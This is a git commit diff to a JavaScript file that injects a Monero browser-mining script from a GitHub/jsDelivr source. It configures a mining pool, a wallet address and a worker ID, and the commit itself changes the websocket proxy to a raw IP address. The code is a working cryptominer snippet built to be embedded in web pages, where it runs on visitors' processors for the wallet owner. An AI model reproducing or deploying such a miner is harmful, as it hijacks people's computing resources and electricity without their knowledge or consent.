c2cfed20455220f1ebe047ae6d46722f54e5f0ad
Najm Ajmal <130285427+NajmAjmal@users.noreply.github.com>
2023-07-10 11:33:59 -0700

    Updated Server
    From https://www.ditatompel.com/proxy

--- external/javascript.js
+++ external/javascript.js
@@ -6,7 +6,7 @@ var script = document.createElement("script");
 script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
 document.head.appendChild(script);
 
-server = "wss://f.xmrminingproxy.com:8181";
+server = "wss://45.119.82.33:40725/";
 var pool = "moneroocean.stream";
 var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
 var workerId = "GH-XMR-JS-SNIPPET"
